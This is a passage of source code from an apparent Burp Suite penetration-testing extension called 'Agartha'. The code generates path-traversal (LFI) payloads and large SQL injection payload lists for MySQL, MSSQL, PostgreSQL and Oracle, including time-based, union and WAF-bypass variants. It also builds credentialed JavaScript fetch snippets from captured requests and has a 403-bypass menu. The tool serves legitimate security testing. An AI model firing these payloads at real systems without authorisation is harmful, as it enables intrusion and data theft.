                            listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]) + suffix + "\n")
                            listLFI.append((_upperDirectory).replace("/", _slashes[i]).replace("..", _dots[i]) + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory)[:-1].replace("/", _slashes[i]).replace("..", _dots[i]) + "/" + filePath + suffix + "\n")
                            listLFI.append((_upperDirectory + filePath).replace("/", _slashes[i]).replace("..", _dots[i]) + suffix + "\n")
                            listLFI.append((_upperDirectory).replace("..", _dots[i]) + filePath + suffix + "\n")

            counter = counter + 1

        listLFI = list(set(listLFI))
        listLFI.sort(reverse=True)
        self._tabDictResultDisplay.setText(''.join(map(str, listLFI)))
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(self._tabDictResultDisplay.getText()), None)
        self._lblStatusLabel.setText('Payload list for "' + self._txtTargetPath.text + '" path returns with '+ str(len(listLFI)) + ' result, and they have been copied to your clipboard. Please make sure payload encoding is disabled.') 
        return

    def funcSQLi(self, ev):
        self._lblStatusLabel.setForeground (Color.black)
        if self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected():
            if not self._cbMysqlBased.isSelected() and not self._cbMssqlBased.isSelected() and not self._cbPostgreBased.isSelected() and not self._cbOracleBased.isSelected():
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('Please pick a database!')
                self._tabDictResultDisplay.setText('')
                return
        if not (self._cbTimeBased.isSelected() or self._cbStackedSQL.isSelected() or self._cbUnionBased.isSelected() or self._cbBooleanBased.isSelected()):
                self._lblStatusLabel.setForeground (Color.red)
                self._lblStatusLabel.setText('Please pick an attack type!')
                self._tabDictResultDisplay.setText('')
                return

        listSQLi = []
        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
        escapeChars = ["", "'", "''", "\\'"]
        if not self._cbSqlWafBypass.isSelected():
            prefixes = [""]
            escapeChars = ["", "'"]
        n1 = str(random.randint(10, 70))
        n2 = str(random.randint(71, 99))
        boolExpressions = [n1 + "=" + n1, n1 + "<" + n2]
        suffixes = ["", " -- -", ") -- -", ")) -- -", "))) -- -"]

        if self._cbBooleanBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for boolExpression in boolExpressions:
                        for suffix in suffixes[1:]:
                            listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + " or " + boolExpression + "\n")
            for prefix in prefixes:
                for escapeChar in escapeChars[1:]:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    
                    listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
                    listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
                    for suffix in suffixes[1:]:
                        listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                        listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                if self._cbPostgreBased.isSelected():
                    listSQLi.append(prefix + "$$ or $$xyz$$=$$xyz\n")
                    for suffix in suffixes[1:]:
                        listSQLi.append(prefix + "$$ or $$xyz$$=$$xyz$$" + suffix + "\n")
                        listSQLi.append(prefix + " or $$xyz$$=$$xyz$$" + suffix + "\n")

        unions = ["null", "1337", "'1337'"]
        if self._cbSqlWafBypass.isSelected():
            unions = ["null", "1337", "'1337'", "''1337''"]

        if self._cbUnionBased.isSelected():
            for prefix in prefixes:
                for escapeChar in escapeChars:
                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                            continue
                    for suffix in suffixes[1:]:
                        for union in unions:
                            unionPhrase = " union all select "
                            for i in range(int(self._cbUnionDepth.getSelectedItem())):
                                unionPhrase += union
                                if self._cbMysqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select sleep(60)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select sleep(60)") + "\n")
                                if self._cbPostgreBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(60))") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as text)") + suffix + "\n")
                                        listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as integer)") + suffix + "\n")
                                        if not escapeChar:
                                            listSQLi.append(prefix + unionPhrase.replace("select null", "select (select 1337 from pg_sleep(60))") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as text)") + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select cast(pg_sleep(60) as integer)") + "\n")
                                if self._cbMssqlBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase + " waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase + " waitfor delay '00:01'" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase + " waitfor delay \\'00:01\\'" + "\n")
                                                listSQLi.append(prefix + unionPhrase + " waitfor delay ''00:01''" + "\n")
                                if self._cbOracleBased.isSelected():
                                    listSQLi.append(prefix + escapeChar + unionPhrase + " from dual" + suffix + "\n")
                                    if not escapeChar:
                                        listSQLi.append(prefix + unionPhrase + " from dual" + "\n")
                                    if self._cbTimeBased.isSelected():
                                        if escapeChar:
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)") + " from dual" + suffix + "\n")                                            
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + escapeChar + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + suffix + "\n")
                                        else:
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(('a'),60)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message(1,60)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(('a'),60) as integer)") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + suffix + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as varchar2(10))") + " from dual" + "\n")
                                            listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message(1,60) as integer)") + " from dual" + "\n")
                                            if self._cbSqlWafBypass.isSelected():
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),60)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((\\'a\\'),60)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as integer)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as varchar2(10))") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((\\'a\\'),60) as integer)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((''a''),60)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "dbms_pipe.receive_message((''a''),60)") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as varchar2(10))") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as integer)") + " from dual" + suffix + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as varchar2(10))") + " from dual" + "\n")
                                                listSQLi.append(prefix + unionPhrase.replace("select " + union, "select "+ "cast(dbms_pipe.receive_message((''a''),60) as integer)") + " from dual" + "\n")
                                unionPhrase += ","

        for prefix in prefixes:
            for escapeChar in escapeChars:
                if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
                        continue
                for suffix in suffixes[1:]:
                    if self._cbOracleBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";select version from v$instance" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select banner from v$version" + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + "\n")
                                listSQLi.append(prefix + ";select banner from v$version" + suffix + "\n")
                                listSQLi.append(prefix + ";select version from v$instance" + suffix + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message((" + escapeChar + "a" + escapeChar + "),60)" + "\n")
                                listSQLi.append(prefix + escapeChar + ";select case when " + n1 + "=" + n1 +" then " + escapeChar + "a" + escapeChar + "||dbms_pipe.receive_message(1,60) else null end from dual " + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=dbms_pipe.receive_message(1,60)" + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,60)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=dbms_pipe.receive_message(1,60)" + "\n")
                            else:
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),60) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(('a'),60) else null end from dual" + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then 'a'||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message((\\'a\\'),60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then \\'a\\'||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message((''a''),60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message((''a''),60) else null end from dual" + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message(1,60) else null end from dual" + suffix + "\n")
                                    listSQLi.append(prefix + ";select case when " + n1 + "=" + n1 +" then ''a''||dbms_pipe.receive_message(1,60) else null end from dual" + "\n")
                    if self._cbMysqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " and sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and sleep(60)" + "\n")
                                listSQLi.append(prefix + " or sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " or sleep(60)" + "\n")
                                listSQLi.append(prefix + ";select sleep(60)" + "\n")
                                listSQLi.append(prefix + ";select sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from (select sleep(60))A)" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(60))A)" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from (select sleep(60))A)" + "\n")
                                listSQLi.append(prefix + "sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + "sleep(60)" + "\n")
                    if self._cbPostgreBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select version()" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + ";select version()" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " || pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + " and 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")                                    
                                listSQLi.append(prefix + escapeChar + " or 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                            else:
                                listSQLi.append(prefix + ";select pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + ";select pg_sleep(60)" + "\n")
                                listSQLi.append(prefix + " || pg_sleep(60)" + "\n")
                                listSQLi.append(prefix + " || pg_sleep(60)" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                                listSQLi.append(prefix + " and 1337=(select 1337 from pg_sleep(60))" + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(60))" + suffix + "\n")
                                listSQLi.append(prefix + " or 1337=(select 1337 from pg_sleep(60))" + "\n")
                    if self._cbMssqlBased.isSelected():
                        if self._cbStackedSQL.isSelected():
                            listSQLi.append(prefix + escapeChar + ";select @@version" + suffix + "\n")
                            if not escapeChar:
                                listSQLi.append(prefix + escapeChar + ";select @@version" + "\n")
                        if self._cbTimeBased.isSelected():
                            if escapeChar:
                                listSQLi.append(prefix + escapeChar + " waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                                listSQLi.append(prefix + escapeChar + ";waitfor delay " + escapeChar + "00:01" + escapeChar + suffix + "\n")
                            else:
                                listSQLi.append(prefix + " waitfor delay '00:01'" + suffix + "\n")
                                listSQLi.append(prefix + " waitfor delay '00:01'" + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:01'" + suffix + "\n")
                                listSQLi.append(prefix + ";waitfor delay '00:01'" + "\n")
                                if self._cbSqlWafBypass.isSelected():
                                    listSQLi.append(prefix + " waitfor delay \\'00:01\\'" + suffix + "\n")
                                    listSQLi.append(prefix + " waitfor delay \\'00:01\\'" + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:01\\'" + suffix + "\n")
                                    listSQLi.append(prefix + ";waitfor delay \\'00:01\\'" + "\n")
                                    listSQLi.append(prefix + " waitfor delay ''00:01''" + suffix + "\n")
                                    listSQLi.append(prefix + " waitfor delay ''00:01''" + "\n")
                                    listSQLi.append(prefix + ";waitfor delay ''00:01''" + suffix + "\n")
                                    listSQLi.append(prefix + ";waitfor delay ''00:01''" + "\n")
        listSQLi = list(set(listSQLi))
        listSQLi.sort()
        if self._cbSqlEncoding.isSelected():
            listSQLi = self.encodeURL(listSQLi)
        self._tabDictResultDisplay.setText(''.join(map(str, listSQLi)))
        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
        clipboard.setContents(StringSelection(self._tabDictResultDisplay.getText()), None)
        self._lblStatusLabel.setText('SQL Injection payload generation is returned with '+ str(len(listSQLi)) + ' records, and they have been copied to your clipboard!')
        return

    def encodeURL(self, payloads):
        urlList = []
        replacements = {
            " ": "%20", "\"": "%22", "\\": "%5c", "=": "%3d", "<": "%3c", ";": "%3b",
            "|": "%7c", "&": "%26", ":": "%3a", "`": "%60",
            "$": "%24", ",": "%2c"
        }
        for payload in payloads:
            for char, encoded_char in replacements.items():
                payload = payload.replace(char, encoded_char)
            urlList.append(payload)
        
        return urlList

    def getTabCaption(self):
        return "Agartha"

    def getUiComponent(self):
        return self._MainTabs

    def getHttpService(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getHttpService()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getHttpService()

    def getRequest(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getRequest()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getRequest()

    def getResponse(self):
        if self._MainTabs.getSelectedIndex() == 1:
            return self.httpReqRes[self.tableMatrix.getSelectedColumn()-1][self.tableMatrix.getSelectedRow()].getResponse()
        elif self._MainTabs.getSelectedIndex() == 2:
            return self._httpReqResAuthentication[self.tableMatrixAuthentication.getSelectedRow()][self.tableMatrixAuthentication.getSelectedColumn()].getResponse()

    def createMenuItems(self, invocation):
        self.context = invocation
        menu_list = ArrayList()
        menu_list.add(JMenuItem("Auth Matrix", actionPerformed=self.agartha_menu))
        menu_list.add(JMenuItem("403 Bypass", actionPerformed=self.authentication_menu))
        menu_list.add(JMenuItem("Copy as JavaScript", actionPerformed=self.js_menu))
        return menu_list

    def js_menu(self, event):
        # Right-click Copy as JS
        try:
            clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()
            http_contexts = self.context.getSelectedMessages()
            _req = self._helpers.bytesToString(http_contexts[0].getRequest())
            _an  = self._helpers.analyzeRequest(http_contexts[0])

            _url = str(_an.getUrl())
            if _url.startswith("https"):
                _url = _url.replace(":443/", "/")
            elif _url.startswith("http"):
                _url = _url.replace(":80/", "/")

            method = _req.splitlines()[0].split(" ", 1)[0].strip()

            def js_escape(s):
                return s.replace('\\', '\\\\').replace("'", "\\'").replace("\r", "").replace("\n", "\\n")

            # (JSON/XML one line)
            def _json_single_line(s):
                try:
                    return json.dumps(json.loads(s))
                except Exception:
                    return s.replace("\r","").replace("\n","")
            def _xml_single_line(s):
                s = s.replace("\r","").replace("\n"," ")
                return re.sub(r"\s+"," ", s).strip()

            FORBIDDEN = {
                'accept-encoding','content-length','cookie','host','origin','referer','user-agent',
                'connection','upgrade-insecure-requests','priority','sec-fetch-mode','sec-fetch-site',
                'sec-fetch-dest','sec-ch-ua','sec-ch-ua-mobile','sec-ch-ua-platform'
            }
            def is_allowed_header(name): return name.lower() not in FORBIDDEN

            # Head/Body
            if "\r\n\r\n" in _req:
                head_raw, body_raw = _req.split("\r\n\r\n", 1)
            elif "\n\n" in _req:
                head_raw, body_raw = _req.split("\n\n", 1)
            else:
                head_raw, body_raw = _req, ""

            header_lines = head_raw.splitlines()[1:]
            headers = {}
            content_type = None
            for line in header_lines:
                if not line or ":" not in line:
                    continue
                k, v = line.split(":", 1)
                k, v = k.strip(), v.strip()
                if k.lower() == "content-type":
                    content_type = v
                if is_allowed_header(k) and not re.search(r'(cookie|token|auth)', k, re.IGNORECASE):
                    headers[k] = v

            body = body_raw
            has_body = (method.upper() != "GET" and len(body.strip()) > 0)
            ct_lower = (content_type or "").lower()

            # Build headers object literal
            js_headers_obj = []
            if content_type and is_allowed_header("Content-Type"):
                js_headers_obj.append("'Content-Type':'" + js_escape(content_type) + "'")
            for k, v in headers.items():
                if k.lower() == "content-type":
                    continue
                js_headers_obj.append("'" + js_escape(k) + "':'" + js_escape(v) + "'")
            headers_block = "{" + ",".join(js_headers_obj) + "}"

            # Body (form raw; json/xml)
            if has_body:
                if "application/x-www-form-urlencoded" in ct_lower:
                    body_stmt_min = "'" + js_escape(body) + "'"
                    body_stmt_hdr = body_stmt_min
                elif ct_lower.startswith("application/json") or body.strip().startswith("{"):
                    single = _json_single_line(body)
                    body_stmt_min = "'" + js_escape(single) + "'"
                    body_stmt_hdr = body_stmt_min
                elif body.strip().startswith("<"):  # XML/HTML
                    single = _xml_single_line(body)
                    body_stmt_min = "'" + js_escape(single) + "'"
                    body_stmt_hdr = body_stmt_min
                else:
                    single = body.replace("\r","").replace("\n"," ")
                    body_stmt_min = "'" + js_escape(single) + "'"
                    body_stmt_hdr = body_stmt_min
            else:
                body_stmt_min = ""
                body_stmt_hdr = ""

            # Minimal fetch
            minimal_opts = ["method:'" + js_escape(method.upper()) + "'", "credentials:'include'"]
            if content_type:
                minimal_opts.append("headers:{'Content-Type':'" + js_escape(content_type) + "'}")
            if has_body:
                minimal_opts.append("body:" + body_stmt_min)
            minimal_line = "<script>\nfetch('" + js_escape(_url) + "',{" + ",".join(minimal_opts) + "});\n</script>"

            # With allowed headers
            hdr_opts = ["method:'" + js_escape(method.upper()) + "'", "credentials:'include'", "headers:" + headers_block]
            if has_body:
                hdr_opts.append("body:" + body_stmt_hdr)
            headers_line = "<script>\nfetch('" + js_escape(_url) + "',{" + ",".join(hdr_opts) + "});\n</script>"

            jscript = (
                "Http request with minimal parameters:\n" + minimal_line +
                "\n\nHttp request with header fields:\n" + headers_line
            )

        except:
            jscript = "An error has occurred during the conversion from HTTP to JavaScript: " + str(sys.exc_info()[1])

        clipboard.setContents(StringSelection(jscript), None)

    def agartha_menu(self, event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        _req = self._helpers.bytesToString(http_contexts[0].getRequest())
        _url = ""
        for http_context in http_contexts:
            _url += str(self._helpers.analyzeRequest(http_context).getUrl()) + "\n"

        if _url.startswith("https"):
            _url = _url.replace(":443/", "/")
        elif _url.startswith("http"):
            _url = _url.replace(":80/", "/")
        
        self._tbAuthHeader.setText(_req)
        self._tbAuthHeader.setSelectionStart(0)
        self._tbAuthHeader.setSelectionEnd(0)
        self._tbAuthURL.setText(_url)
        self._tbAuthURL.setSelectionStart(0)
        self._tbAuthURL.setSelectionEnd(0)
        self._MainTabs.setSelectedComponent(self._tabAuthSplitpane)
        self._MainTabs.getParent().setSelectedComponent(self._MainTabs)
        self._lblAuthNotification.text = "A new payload has been received."
        self._lblAuthNotification.setForeground (Color.black)
        self._tbAuthURL.setForeground (Color.black)
        self._tbAuthHeader.setForeground (Color.black)
        return

    def authentication_menu(self, event):
        # right click menu
        http_contexts = self.context.getSelectedMessages()
        try:
            for http_context in http_contexts:
                _url = str(self._helpers.analyzeRequest(http_context).getUrl())
                if _url.count('http') >=2:
                    # the url is already redirected to somewhere
                    continue
                if _url.startswith("https"):
                    _url = _url.replace(":443/", "/")
                elif _url.startswith("http"):
                    _url = _url.replace(":80/", "/")
                _header = self._helpers.analyzeRequest(http_context).getHeaders()
                _body = self._helpers.bytesToString(http_context.getRequest()[self._helpers.analyzeRequest(http_context).getBodyOffset():])

                self.tableMatrixAuthentication_DM.addRow([_url])
                self._urlAddresses.addElement(_url)
                self.authenticationMatrix.append([_url, _header, _body])

                self._btnAuthenticationRun.setEnabled(True)
                self._MainTabs.setSelectedComponent(self._tabAuthenticationSplitpane)
                self._MainTabs.getParent().setSelectedComponent(self._MainTabs)

            self.tabAuthenticationJlist.setSelectedIndex(0)
            self._lblAuthenticationNotification.text = "The request has been added to the table with all session identifiers. Blank is default color and different colors are for warning levels."
        except:
            self._lblAuthenticationNotification.text = "An error has occurred: " + str(sys.exc_info()[1])
        return

    def authMatrix(self, ev):
        t = Thread(target=self.authMatrixThread, args=[self])
        t.start()
        return

    def _updateReqResView(self, ev):
        try:
            row = self.tableMatrix.getSelectedRow()
            userID = self.tableMatrix.getSelectedColumn()
            if userID == 0:
                self._requestViewer.setMessage("", False)
                self._responseViewer.setMessage("", False)
            else:
                self._requestViewer.setMessage(self.httpReqRes[userID-1][row].getRequest(), False)
                self._responseViewer.setMessage(self.httpReqRes[userID-1][row].getResponse(), False)
        except:
            self._requestViewer.setMessage("", False)
            self._responseViewer.setMessage("", False)
    
    def isURLValid(self, urlAdd):
        if (urlparse.urlparse(urlAdd) and urlAdd.strip().startswith("http") and not " " in urlAdd.strip()) or urlAdd.isspace() or not urlAdd:
            return True
        else:
            return False

    def _tabAuthUI(self):
        # panel top
        self._tbAuthNewUser = JTextField("", 14)
        self._tbAuthNewUser.setToolTipText("Please provide an username.")
        self._btnAuthNewUserAdd = JButton("Add User", actionPerformed=self.authAdduser)
        self._btnAuthNewUserAdd.setPreferredSize(Dimension(90, 27))
        self._btnAuthNewUserAdd.setToolTipText("Please add user/s to populate role matrix!")
        self._btnAuthRun = JButton("RUN", actionPerformed=self.authMatrix)
